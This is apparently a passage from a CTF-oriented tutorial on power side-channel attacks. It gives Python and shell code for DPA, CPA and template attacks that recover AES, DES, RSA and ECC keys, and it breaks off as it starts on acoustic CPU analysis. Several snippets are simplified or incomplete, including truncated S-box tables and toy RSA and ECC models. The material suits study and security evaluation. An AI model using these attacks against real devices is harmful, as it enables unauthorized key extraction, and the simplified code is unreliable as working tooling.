```python
from chipwhisperer.analyzer.attacks.cpa import CPA
from chipwhisperer.analyzer.attacks.models.AES128_8bit import AES128_8bit, SBox_output

# Load project with traces
project = cw.open_project('dpa_aes_capture')

# Configure attack
attack = CPA()
attack.setProject(project)
attack.setPointRange((0, -1))  # Use all samples
attack.setModel(AES128_8bit(SBox_output))  # Attack S-box output
attack.setReportingInterval(10)

# Run attack
results = attack.run()

# Display results
print("Key bytes recovered:")
for i in range(16):
    byte_val = results.find_key()[i]
    pge = results.pge[i]  # Partial Guessing Entropy
    print(f"Byte {i}: 0x{byte_val:02x} (PGE: {pge})")
```

**Power Models for DPA:**

Common leakage models:

1. **Hamming Weight Model**:

```python
def hamming_weight_model(value):
    """
    Most common model - counts number of 1 bits
    [Inference] Assumes power proportional to bits set to 1
    """
    return bin(value).count('1')
```

2. **Hamming Distance Model**:

```python
def hamming_distance_model(old_value, new_value):
    """
    Counts bit flips between states
    [Inference] Assumes power consumed during state transitions
    """
    return bin(old_value ^ new_value).count('1')
```

3. **Identity Model**:

```python
def identity_model(value):
    """
    Simplest model - uses value directly
    Less accurate but computationally faster
    """
    return value
```

**DPA Against DES:**

DES round function DPA:

```python
# DES S-boxes (8 different 6-bit to 4-bit substitutions)
# Attacking single S-box output

def des_sbox_output(input_bits, key_bits, sbox_num):
    """
    Calculate S-box output for DES round function
    [Inference] Implementation details depend on DES variant
    """
    # XOR input with key (6 bits)
    xored = input_bits ^ key_bits
    
    # Apply S-box transformation
    # (Simplified - actual DES S-box lookup omitted for brevity)
    output = DES_SBOXES[sbox_num][xored]
    return output

def dpa_des(traces, plaintexts, sbox_num, round_num=1):
    """
    DPA attack on DES S-box in specified round
    """
    key_candidates = range(64)  # 6-bit key space per S-box
    correlations = np.zeros(64)
    
    for key_guess in key_candidates:
        predicted = np.array([
            hamming_weight(des_sbox_output(
                extract_sbox_input(pt, sbox_num, round_num),
                key_guess,
                sbox_num
            ))
            for pt in plaintexts
        ])
        
        # Find maximum correlation across all samples
        max_corr = 0
        for sample in range(traces.shape[1]):
            corr = np.corrcoef(predicted, traces[:, sample])[0, 1]
            if abs(corr) > abs(max_corr):
                max_corr = corr
        
        correlations[key_guess] = max_corr
    
    return np.argmax(np.abs(correlations)), correlations
```

**Second-Order DPA:**

[Inference] When implementations include masking countermeasures, second-order DPA combines information from two points in time:

```python
def second_order_dpa(traces, plaintexts, offset1, offset2):
    """
    Combine two leakage points to defeat first-order masking
    [Unverified] Requires precise identification of leakage points
    """
    num_traces = len(traces)
    
    # Extract samples at two time points
    samples1 = traces[:, offset1]
    samples2 = traces[:, offset2]
    
    # Combine using preprocessing (multiplication or absolute difference)
    combined = samples1 * samples2  # Preprocessing function
    
    # Standard DPA on combined trace
    correlations = np.zeros(256)
    for key_guess in range(256):
        predicted = np.array([
            hamming_weight(aes_internal_state(pt[0], key_guess))
            for pt in plaintexts
        ])
        correlations[key_guess] = np.corrcoef(predicted, combined)[0, 1]
    
    return np.argmax(np.abs(correlations)), correlations
```

**Trace Preprocessing for DPA:**

Improving attack success:

```python
# Remove DC offset
def remove_dc_offset(traces):
    """
    Subtract mean from each trace
    """
    return traces - np.mean(traces, axis=1, keepdims=True)

# Bandpass filtering
from scipy.signal import butter, filtfilt

def bandpass_filter(traces, lowcut, highcut, fs, order=5):
    """
    Apply bandpass filter to remove noise
    """
    nyquist = 0.5 * fs
    low = lowcut / nyquist
    high = highcut / nyquist
    b, a = butter(order, [low, high], btype='band')
    
    filtered = np.zeros_like(traces)
    for i in range(len(traces)):
        filtered[i] = filtfilt(b, a, traces[i])
    
    return filtered

# Trace alignment (if jitter present)
from scipy.signal import correlate

def align_traces(traces, reference_trace=None):
    """
    Align traces using cross-correlation
    [Inference] Assumes traces have identifiable reference pattern
    """
    if reference_trace is None:
        reference_trace = traces[0]
    
    aligned = np.zeros_like(traces)
    for i in range(len(traces)):
        correlation = correlate(traces[i], reference_trace, mode='same')
        shift = np.argmax(correlation) - len(reference_trace) // 2
        aligned[i] = np.roll(traces[i], shift)
    
    return aligned
```

**Tools for DPA:**

Riscure Inspector (commercial):

```bash
# Inspector is proprietary - used professionally
# Provides advanced DPA/CPA capabilities with GUI
# Not typically available in CTF environments
```

Daredevil (open-source):

```bash
# Install Daredevil
git clone https://github.com/SideChannelMarvels/Daredevil.git
cd Daredevil
make

# Prepare trace file (binary format)
# Format: [trace1_sample1, trace1_sample2, ..., trace2_sample1, ...]

# Run DPA attack
./daredevil -c attack_config.conf

# Example config file (attack_config.conf):
cat > attack_config.conf << 'EOF'
[Traces]
files=1
trace_type=i  # integer samples
transpose=true
index=0
nsamples=5000
trace=traces.bin  # Binary trace file

[Guesses]
files=1
guess_type=u  # unsigned bytes
transpose=true
guess=plaintexts.bin  # Known plaintexts

[General]
threads=8
order=1  # First-order DPA
return_type=d  # Distinguish correct from wrong
algorithm=AES
position=0  # Attack byte position
round=0  # First round
bitnum=all  # All bits
bytenum=all  # All bytes (if position allows)
correct_key=0x2b7e151628aed2a6abf7158809cf4f3c  # If known (for testing)

[Statistics]
method=cpa  # Correlation Power Analysis
EOF
```

**[Unverified]** Professional DPA attacks in hardware security evaluations may require 10,000+ traces for high confidence, but CTF challenges typically work with 1,000-5,000 traces.

### Correlation Power Analysis (CPA)

Correlation Power Analysis is a refined form of DPA that uses Pearson correlation coefficient to measure relationship between power consumption and predicted intermediate values. CPA typically requires fewer traces than classical DPA and provides clearer results.

**Core Concepts:**

- **Pearson correlation**: Measures linear relationship between predicted and observed power
- **Point-wise correlation**: Calculates correlation at each sample point independently
- **Correlation matrix**: Maps key guesses vs. time samples to find correct key and leakage points
- **Higher sensitivity**: Often successful with fewer traces than DPA

**Pearson Correlation Coefficient:**

```python
def pearson_correlation(x, y):
    """
    Calculate Pearson correlation coefficient
    r = cov(X,Y) / (std(X) * std(Y))
    Returns value between -1 and 1
    """
    if len(x) != len(y):
        raise ValueError("Arrays must have same length")
    
    mean_x = np.mean(x)
    mean_y = np.mean(y)
    
    numerator = np.sum((x - mean_x) * (y - mean_y))
    denominator = np.sqrt(np.sum((x - mean_x)**2) * np.sum((y - mean_y)**2))
    
    if denominator == 0:
        return 0
    
    return numerator / denominator

# NumPy built-in (more efficient):
correlation = np.corrcoef(x, y)[0, 1]
```

**CPA Attack Implementation:**

Complete CPA against AES:

```python
def cpa_attack(traces, plaintexts, byte_position, leakage_model='HW'):
    """
    Full CPA attack on single AES key byte
    
    Args:
        traces: Power traces array (num_traces x num_samples)
        plaintexts: Known plaintext inputs
        byte_position: Which key byte to attack (0-15)
        leakage_model: 'HW' (Hamming Weight) or 'HD' (Hamming Distance)
    
    Returns:
        best_key: Most likely key byte value
        correlation_matrix: Full correlation results
    """
    num_traces = traces.shape[0]
    num_samples = traces.shape[1]
    
    # Initialize correlation matrix: 256 key guesses x num_samples
    correlation_matrix = np.zeros((256, num_samples))
    
    # AES S-box
    sbox = [
        0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
        0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
        0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
        0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
        0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
        0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
        0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
        0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
        0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
        0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
        0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
        0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
        0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
        0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
        0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
        0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
    ]
    
    # Precompute hypothetical intermediate values for all key guesses
    hypothetical_values = np.zeros((256, num_traces), dtype=np.uint8)
    
    for key_guess in range(256):
        for trace_idx in range(num_traces):
            # Calculate intermediate value: S-box(plaintext XOR key)
            state = plaintexts[trace_idx][byte_position] ^ key_guess
            hypothetical_values[key_guess, trace_idx] = sbox[state]
    
    # Apply leakage model
    if leakage_model == 'HW':
        # Hamming Weight model
        hypothetical_power = np.array([
            [bin(val).count('1') for val in row]
            for row in hypothetical_values
        ], dtype=np.float64)
    elif leakage_model == 'HD':
        # Hamming Distance model (if previous state known)
        # [Inference] Requires knowledge of previous register state
        hypothetical_power = hypothetical_values.astype(np.float64)
    else:
        # Identity model
        hypothetical_power = hypothetical_values.astype(np.float64)
    
    # Calculate correlation for each key guess at each sample point
    for key_guess in range(256):
        for sample_idx in range(num_samples):
            # Pearson correlation between hypothetical power and actual trace
            correlation = np.corrcoef(
                hypothetical_power[key_guess],
                traces[:, sample_idx]
            )[0, 1]
            
            # Handle NaN from zero variance
            if np.isnan(correlation):
                correlation = 0
            
            correlation_matrix[key_guess, sample_idx] = correlation
    
    # Find key guess with maximum absolute correlation
    max_correlations = np.max(np.abs(correlation_matrix), axis=1)
    best_key = np.argmax(max_correlations)
    
    return best_key, correlation_matrix

# Attack all 16 bytes
def cpa_full_key_recovery(traces, plaintexts):
    """
    Recover full 128-bit AES key using CPA
    """
    recovered_key = []
    
    for byte_pos in range(16):
        print(f"Attacking byte {byte_pos}...")
        key_byte, corr_matrix = cpa_attack(traces, plaintexts, byte_pos)
        max_corr = np.max(np.abs(corr_matrix[key_byte]))
        
        recovered_key.append(key_byte)
        print(f"  Recovered: 0x{key_byte:02x} (max correlation: {max_corr:.4f})")
    
    return bytes(recovered_key)

# Example usage:
# traces = np.load('power_traces.npy')
# plaintexts = np.load('plaintexts.npy')
# key = cpa_full_key_recovery(traces, plaintexts)
# print(f"Full key: {key.hex()}")
```

**Visualizing CPA Results:**

```python
import numpy as np
import matplotlib.pyplot as plt

def plot_cpa_results(correlation_matrix: np.ndarray, correct_key: int | None = None):
    """
    Visualize CPA correlation matrix.

    Parameters
    ----------
    correlation_matrix : np.ndarray
        2D array of shape (256, n_samples) containing correlation coefficients
        for each key guess (0-255) across sample points (time).
    correct_key : int | None
        Optional correct key to highlight in plots (0-255).
    """
    # Basic validation
    if correlation_matrix.ndim != 2 or correlation_matrix.shape[0] != 256:
        raise ValueError("correlation_matrix must have shape (256, n_samples)")

    fig, (ax1, ax2) = plt.subplots(2, 1, figsize=(15, 8))

    # Plot 1: Correlation over time for all key guesses
    for key_guess in range(256):
        series = correlation_matrix[key_guess]
        if (correct_key is not None) and (key_guess == correct_key):
            ax1.plot(series, "r-", linewidth=2, label="Correct key")
        else:
            ax1.plot(series, "b-", alpha=0.08)

    ax1.set_xlabel("Sample Point")
    ax1.set_ylabel("Correlation Coefficient")
    ax1.set_title("CPA: Correlation Over Time")
    ax1.grid(True)
    if correct_key is not None:
        ax1.legend()

    # Plot 2: Maximum absolute correlation for each key guess
    max_correlations = np.max(np.abs(correlation_matrix), axis=1)
    ax2.bar(range(256), max_correlations, alpha=0.6)

    if correct_key is not None:
        ax2.bar(correct_key, max_correlations[correct_key], color="red", label="Correct key")
        ax2.legend()

    # Highlight top 5 candidates (highest max correlation)
    top_5 = np.argsort(max_correlations)[::-1][:5]  # descending
    for idx in top_5:
        ax2.bar(idx, max_correlations[idx], color="orange", alpha=0.85)

    ax2.set_xlabel("Key Guess (0-255)")
    ax2.set_ylabel("Maximum Absolute Correlation")
    ax2.set_title("CPA: Key Ranking")
    ax2.grid(True, axis="y")

    plt.tight_layout()
    plt.show()

    # Print top candidates
    print("\nTop 5 key candidates:")
    for rank, idx in enumerate(top_5, start=1):
        print(f"  {rank}. Key 0x{idx:02x}: correlation {max_correlations[idx]:.4f}")


# Example usage (uncomment and run in your environment):
# correlation_matrix = np.random.randn(256, 1000)  # replace with real CPA results
# plot_cpa_results(correlation_matrix, correct_key=0x2b)
````

**CPA with ChipWhisperer:**

```python
import chipwhisperer as cw
from chipwhisperer.analyzer.attacks.cpa import CPA
from chipwhisperer.analyzer.attacks.cpa_algorithms.progressive import CPAProgressive

# Load captured traces
project = cw.open_project('cpa_captures.cwp')

# Initialize CPA attack
attack = CPA()
leak_model = cw.leakage_models.sbox_output  # S-box output leakage
attack.setAnalysis(leak_model)

# Configure attack parameters
attack.setTargetBytes([0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15])  # All bytes
attack.setPointRange((0, -1))  # All sample points
attack.setTraceStart(0)
attack.setTracesPerAttack(1000)  # Number of traces to use

# Execute attack
results = attack.processTraces()

# Get results
recovered_key = results.find_key()
print(f"Recovered key: {recovered_key.hex()}")

# Analyze quality of attack
for byte_idx in range(16):
    pge = results.pge[byte_idx]  # Partial Guessing Entropy
    corr = results.max_corr[byte_idx]
    print(f"Byte {byte_idx}: 0x{recovered_key[byte_idx]:02x} - PGE: {pge}, Correlation: {corr:.4f}")
````

**Progressive CPA (Trace Efficiency Analysis):**

```python
def progressive_cpa(traces, plaintexts, byte_position, step_size=50):
    """
    Perform CPA with increasing number of traces
    Shows minimum traces needed for successful attack
    
    [Inference] Helps determine trace requirements for specific targets
    """
    max_traces = len(traces)
    results = []
    
    for num_traces in range(step_size, max_traces + 1, step_size):
        # Run CPA with subset of traces
        subset_traces = traces[:num_traces]
        subset_plaintexts = plaintexts[:num_traces]
        
        key_byte, corr_matrix = cpa_attack(subset_traces, subset_plaintexts, byte_position)
        max_corr = np.max(np.abs(corr_matrix[key_byte]))
        
        results.append({
            'num_traces': num_traces,
            'key_byte': key_byte,
            'correlation': max_corr
        })
        
        print(f"Traces: {num_traces:4d} - Key: 0x{key_byte:02x} - Corr: {max_corr:.4f}")
    
    return results

# Visualize progressive attack
def plot_progressive_cpa(results, correct_key):
    """
    Plot how key recovery improves with more traces
    """
    num_traces = [r['num_traces'] for r in results]
    correlations = [r['correlation'] for r in results]
    key_correct = [r['key_byte'] == correct_key for r in results]
    
    fig, (ax1, ax2) = plt.subplots(2, 1, figsize=(12, 8))
    
    # Correlation growth
    ax1.plot(num_traces, correlations, 'b-o', linewidth=2)
    ax1.set_xlabel('Number of Traces')
    ax1.set_ylabel('Maximum Correlation')
    ax1.set_title('CPA: Correlation vs Number of Traces')
    ax1.grid(True)
    
    # Key correctness
    colors = ['red' if not correct else 'green' for correct in key_correct]
    ax2.scatter(num_traces, [1 if c else 0 for c in key_correct], c=colors, s=100)
    ax2.set_xlabel('Number of Traces')
    ax2.set_ylabel('Correct Key Recovered')
    ax2.set_yticks([0, 1])
    ax2.set_yticklabels(['Wrong', 'Correct'])
    ax2.set_title('CPA: Key Recovery Success')
    ax2.grid(True, axis='x')
    
    plt.tight_layout()
    plt.show()
```

**CPA Against RSA (CRT Implementation):**

[Inference] RSA-CRT implementations leak through modular exponentiation operations:

```python
def cpa_rsa_crt(traces, messages, p_bit_position):
    """
    CPA attack on RSA-CRT to recover prime factor p
    Targets modular exponentiation: m^d mod p
    
    [Unverified] Success depends on implementation details
    """
    correlations = np.zeros((2, traces.shape[1]))  # Binary guess for bit
    
    # For each bit position in prime p
    for bit_guess in [0, 1]:
        # Predict power based on bit value
        predicted_power = []
        
        for msg in messages:
            # Hypothetical computation with bit guess
            # [Inference] Power varies based on multiply vs square-only
            if bit_guess == 1:
                power_prediction = hamming_weight(msg)  # Simplified
            else:
                power_prediction = 0
            predicted_power.append(power_prediction)
        
        predicted_power = np.array(predicted_power)
        
        # Calculate correlation at each time point
        for sample_idx in range(traces.shape[1]):
            corr = np.corrcoef(predicted_power, traces[:, sample_idx])[0, 1]
            correlations[bit_guess, sample_idx] = corr if not np.isnan(corr) else 0
    
    # Bit with higher maximum correlation is likely correct
    max_corr_0 = np.max(np.abs(correlations[0]))
    max_corr_1 = np.max(np.abs(correlations[1]))
    
    recovered_bit = 1 if max_corr_1 > max_corr_0 else 0
    return recovered_bit, correlations
```

**CPA on ECC (Elliptic Curve Cryptography):**

```python
def cpa_ecc_scalar_mult(traces, points, scalar_bit_position):
    """
    CPA against ECC scalar multiplication
    Targets point doubling vs point addition distinction
    
    [Inference] Exploits different operations for 0 vs 1 in scalar
    """
    correlations = np.zeros((2, traces.shape[1]))
    
    for bit_value in [0, 1]:
        predicted = []
        
        for point in points:
            if bit_value == 1:
                # Point addition expected
                prediction = hamming_weight(point[0])  # x-coordinate
            else:
                # Point doubling only
                prediction = hamming_weight(point[0] * 2)  # Simplified model
            
            predicted.append(prediction)
        
        predicted = np.array(predicted)
        
        for sample_idx in range(traces.shape[1]):
            corr = np.corrcoef(predicted, traces[:, sample_idx])[0, 1]
            correlations[bit_value, sample_idx] = corr if not np.isnan(corr) else 0
    
    # Determine which bit value has higher correlation
    if np.max(np.abs(correlations[1])) > np.max(np.abs(correlations[0])):
        return 1, correlations
    else:
        return 0, correlations
```

**Advanced CPA Techniques:**

**1. Template Attack (Profiled CPA):**

```python
def build_templates(profiling_traces, profiling_keys, num_classes=256):
    """
    Build power consumption templates from known-key traces
    [Inference] Requires access to identical device for profiling
    """
    templates = {}
    
    for class_value in range(num_classes):
        # Find traces corresponding to this intermediate value
        mask = (profiling_keys == class_value)
        class_traces = profiling_traces[mask]
        
        if len(class_traces) > 0:
            # Calculate mean and covariance
            mean = np.mean(class_traces, axis=0)
            cov = np.cov(class_traces.T)
            
            templates[class_value] = {
                'mean': mean,
                'cov': cov,
                'count': len(class_traces)
            }
    
    return templates

def template_attack(templates, attack_traces, plaintexts, byte_position):
    """
    Apply templates to attack traces
    """
    from scipy.stats import multivariate_normal
    
    num_traces = len(attack_traces)
    log_probabilities = np.zeros((256, num_traces))
    
    sbox = [0x63, 0x7c, 0x77, 0x7b, ...]  # Full S-box
    
    for key_guess in range(256):
        for trace_idx in range(num_traces):
            # Calculate intermediate value
            intermediate = sbox[plaintexts[trace_idx][byte_position] ^ key_guess]
            
            # Get template for this intermediate value
            if intermediate in templates:
                template = templates[intermediate]
                
                # Calculate log probability (avoid numerical issues)
                try:
                    prob = multivariate_normal.logpdf(
                        attack_traces[trace_idx],
                        mean=template['mean'],
                        cov=template['cov']
                    )
                except:
                    prob = -np.inf
                
                log_probabilities[key_guess, trace_idx] = prob
    
    # Sum log probabilities across all traces
    total_log_prob = np.sum(log_probabilities, axis=1)
    best_key = np.argmax(total_log_prob)
    
    return best_key, total_log_prob
```

**2. Multi-bit CPA:**

```python
def multibit_cpa(traces, plaintexts, byte_position, num_bits=8):
    """
    Perform CPA on multiple bits simultaneously
    Can improve attack efficiency
    
    [Inference] May reduce required traces but increases computation
    """
    num_samples = traces.shape[1]
    best_keys = []
    
    sbox = [0x63, 0x7c, ...]  # Full S-box
    
    # Attack each bit position independently
    for bit_pos in range(num_bits):
        correlations = np.zeros((256, num_samples))
        
        for key_guess in range(256):
            # Predict single bit value
            predicted_bits = []
            
            for pt in plaintexts:
                intermediate = sbox[pt[byte_position] ^ key_guess]
                bit_value = (intermediate >> bit_pos) & 1
                predicted_bits.append(bit_value)
            
            predicted_bits = np.array(predicted_bits, dtype=float)
            
            # Correlate with traces
            for sample in range(num_samples):
                corr = np.corrcoef(predicted_bits, traces[:, sample])[0, 1]
                correlations[key_guess, sample] = corr if not np.isnan(corr) else 0
        
        # Find best key for this bit
        max_corrs = np.max(np.abs(correlations), axis=1)
        best_key_this_bit = np.argmax(max_corrs)
        best_keys.append(best_key_this_bit)
    
    # Use voting or most common key
    from collections import Counter
    key_counts = Counter(best_keys)
    final_key = key_counts.most_common(1)[0][0]
    
    return final_key, best_keys
```

**CPA on Protected Implementations:**

**Detecting Masking:**

```python
def detect_masking(traces):
    """
    Identify if target uses boolean masking countermeasure
    [Inference] Masked implementations show reduced first-order leakage
    """
    # Calculate SNR (Signal-to-Noise Ratio)
    signal = np.mean(traces, axis=0)
    noise = np.std(traces, axis=0)
    
    snr = np.abs(signal) / (noise + 1e-10)  # Avoid division by zero
    
    avg_snr = np.mean(snr)
    print(f"Average SNR: {avg_snr:.4f}")
    
    if avg_snr < 0.1:
        print("[Inference] Low SNR suggests masking or other countermeasures")
        return True
    else:
        print("[Inference] Normal SNR suggests no masking")
        return False

# Visualize SNR
def plot_snr(traces):
    """
    Plot Signal-to-Noise Ratio across trace
    """
    signal = np.mean(traces, axis=0)
    noise = np.std(traces, axis=0)
    snr = 20 * np.log10(np.abs(signal) / (noise + 1e-10))  # SNR in dB
    
    plt.figure(figsize=(15, 4))
    plt.plot(snr)
    plt.xlabel('Sample Point')
    plt.ylabel('SNR (dB)')
    plt.title('Signal-to-Noise Ratio Analysis')
    plt.grid(True)
    plt.show()
```

**Horizontal CPA:**

[Inference] Attacks single trace by correlating different time segments:

```python
def horizontal_cpa(single_trace, operation_offsets):
    """
    Perform CPA within a single trace
    Useful when multiple operations on different key bytes occur
    
    [Unverified] Requires precise identification of operation boundaries
    """
    correlations = np.zeros(256)
    
    # Extract segments corresponding to different operations
    segments = [single_trace[offset:offset+100] for offset in operation_offsets]
    
    for key_guess in range(256):
        # Predict power for each segment based on key guess
        predicted = [hamming_weight(key_guess ^ i) for i in range(len(segments))]
        
        # Calculate mean power in each segment
        segment_powers = [np.mean(seg) for seg in segments]
        
        # Correlate predicted with observed
        if len(predicted) > 1:
            corr = np.corrcoef(predicted, segment_powers)[0, 1]
            correlations[key_guess] = corr if not np.isnan(corr) else 0
    
    best_key = np.argmax(np.abs(correlations))
    return best_key, correlations
```

**Practical CTF Tools and Scripts:**

**Quick CPA with Scared (Side-Channel Analysis for Reverse Engineering):**

```bash
# Install scared
pip install scared

# Python script for quick CPA
python3 << 'EOF'
import scared
import numpy as np

# Load traces and plaintexts
ths = scared.traces.read_ths_from_ram(
    samples=np.load('traces.npy'),
    plaintext=np.load('plaintexts.npy')
)

# Define AES selection function (S-box output)
@scared.attack_selection_function
def aes_sbox_output(plaintext, key_guess, byte_index):
    sbox = [0x63, 0x7c, ...]  # Full S-box
    return sbox[plaintext[byte_index] ^ key_guess]

# Create CPA attack
attack = scared.CPAAttack(
    selection_function=aes_sbox_output,
    model=scared.HammingWeight(),
    discriminant=scared.maxabs
)

# Run attack on byte 0
attack.run(ths, byte_index=0)

# Get results
results = attack.results
print(f"Best key candidate: 0x{results[0]:02x}")
print(f"Correlation: {attack.scores[results[0]]:.4f}")
EOF
```

**Automated Multi-Byte CPA:**

```bash
#!/bin/bash
# cpa_all_bytes.sh - Attack all 16 AES key bytes

TRACES_FILE="traces.npy"
PLAINTEXTS_FILE="plaintexts.npy"

python3 << 'EOF'
import numpy as np
from cpa_attack import cpa_attack  # Custom implementation

traces = np.load('traces.npy')
plaintexts = np.load('plaintexts.npy')

recovered_key = []

for byte_pos in range(16):
    print(f"\n[*] Attacking byte {byte_pos}...")
    key_byte, corr_matrix = cpa_attack(traces, plaintexts, byte_pos)
    max_corr = np.max(np.abs(corr_matrix[key_byte]))
    
    # Get second-best candidate for comparison
    sorted_indices = np.argsort(np.max(np.abs(corr_matrix), axis=1))
    second_best = sorted_indices[-2]
    second_corr = np.max(np.abs(corr_matrix[second_best]))
    
    recovered_key.append(key_byte)
    
    print(f"[+] Best candidate: 0x{key_byte:02x} (correlation: {max_corr:.4f})")
    print(f"[+] 2nd candidate:  0x{second_best:02x} (correlation: {second_corr:.4f})")
    print(f"[+] Confidence: {((max_corr - second_corr) / max_corr * 100):.2f}%")

print(f"\n[+] Recovered key: {bytes(recovered_key).hex()}")

# Save results
np.save('recovered_key.npy', recovered_key)
EOF
```

**Trace Quality Assessment:**

```python
def assess_trace_quality(traces, plaintexts, known_key=None):
    """
    Evaluate if traces are suitable for CPA
    Provides metrics on trace quality
    """
    print("=== Trace Quality Assessment ===\n")
    
    # Basic statistics
    print(f"Number of traces: {len(traces)}")
    print(f"Samples per trace: {traces.shape[1]}")
    print(f"Trace dtype: {traces.dtype}")
    
    # Dynamic range
    trace_min = np.min(traces)
    trace_max = np.max(traces)
    dynamic_range = trace_max - trace_min
    print(f"\nDynamic range: {dynamic_range:.4f}")
    print(f"Min value: {trace_min:.4f}")
    print(f"Max value: {trace_max:.4f}")
    
    # SNR estimation
    signal = np.mean(traces, axis=0)
    noise = np.std(traces, axis=0)
    snr = np.mean(np.abs(signal) / (noise + 1e-10))
    print(f"\nAverage SNR: {snr:.4f}")
    
    # Trace alignment check
    # Compare first trace with average
    first_trace = traces[0]
    avg_trace = np.mean(traces, axis=0)
    alignment_corr = np.corrcoef(first_trace, avg_trace)[0, 1]
    print(f"Alignment correlation: {alignment_corr:.4f}")
    
    if alignment_corr < 0.8:
        print("[!] Warning: Traces may be misaligned")
    
    # If known key provided, test attack success
    if known_key is not None:
        print("\n=== Attack Success Test ===")
        for byte_pos in [0, 4, 8, 12]:  # Test few bytes
            key_byte, corr_matrix = cpa_attack(traces, plaintexts, byte_pos)
            correct = (key_byte == known_key[byte_pos])
            max_corr = np.max(np.abs(corr_matrix[key_byte]))
            
            status = "✓" if correct else "✗"
            print(f"Byte {byte_pos}: {status} 0x{key_byte:02x} (corr: {max_corr:.4f})")
    
    print("\n" + "="*35)
```

**Important Related Topics:**

- Template Attacks and Stochastic Models (profiled attacks requiring training phase)
- Higher-Order CPA (defeating masking countermeasures with multi-variate analysis)
- Mutual Information Analysis (MIA) (non-linear alternative to correlation)
- Horizontal Attacks (exploiting algorithmic structure within single traces)

---

## Acoustic Attacks

### CPU Sound Analysis

CPU sound analysis exploits acoustic emissions generated by electrical components during computation. Different operations produce distinct frequency patterns that can leak information about executed instructions, processed data, or cryptographic keys. This side-channel attack vector is particularly relevant for air-gapped systems where traditional network-based exfiltration is impossible.

**Physical Principles**

CPUs generate acoustic noise through:

- **Capacitor vibrations**: Switching transistors cause capacitors to physically vibrate at frequencies corresponding to operation patterns
- **Voltage regulator module (VRM) noise**: Power delivery circuits produce audible frequencies during load changes
- **PCB resonance**: Circuit board components resonate at specific frequencies under electrical stress

[Inference] The frequency spectrum typically ranges from 1 kHz to 20 kHz (human audible range), with some attacks utilizing ultrasonic frequencies up to 24 kHz detectable by specialized microphones.

**Attack Methodology**

```bash
# Step 1: Audio capture setup
# Install audio recording tools
apt-get install audacity sox libsox-fmt-all python3-pyaudio

# Record audio with high sample rate (96 kHz or higher recommended)
arecord -f S16_LE -r 96000 -c 1 -d 60 cpu_audio.wav

# Alternative: Use SoX for long-duration recording
rec -r 96000 -c 1 -b 16 cpu_audio.wav

# Step 2: Verify recording quality
sox cpu_audio.wav -n stats
```

**Frequency Analysis**

```bash
# Generate spectrogram for visual analysis
sox cpu_audio.wav -n spectrogram -o spectrogram.png -r

# Extract specific frequency ranges
sox cpu_audio.wav filtered.wav bandpass 2000 500

# Perform FFT analysis
# Install scipy and numpy if needed
apt-get install python3-scipy python3-numpy python3-matplotlib
```

**Python Analysis Script**

```python
#!/usr/bin/env python3
import numpy as np
import scipy.io.wavfile as wav
import scipy.signal as signal
import matplotlib.pyplot as plt

# Load audio file
sample_rate, audio_data = wav.read('cpu_audio.wav')

# Convert to mono if stereo
if len(audio_data.shape) > 1:
    audio_data = audio_data[:, 0]

# Perform Short-Time Fourier Transform
frequencies, times, spectrogram = signal.spectrogram(
    audio_data, 
    fs=sample_rate,
    window='hamming',
    nperseg=4096,
    noverlap=3072
)

# Plot spectrogram
plt.pcolormesh(times, frequencies, 10 * np.log10(spectrogram), shading='gouraud')
plt.ylabel('Frequency [Hz]')
plt.xlabel('Time [sec]')
plt.colorbar(label='Power [dB]')
plt.ylim(0, 10000)  # Focus on relevant frequency range
plt.savefig('cpu_spectrogram.png', dpi=300)

# Identify peak frequencies
peak_freqs = []
for i in range(spectrogram.shape[1]):
    freq_slice = spectrogram[:, i]
    peak_idx = np.argmax(freq_slice)
    peak_freqs.append(frequencies[peak_idx])

print(f"Dominant frequencies: {set([round(f, -1) for f in peak_freqs])}")
```

**CTF-Relevant Techniques**

**RSA Key Extraction**

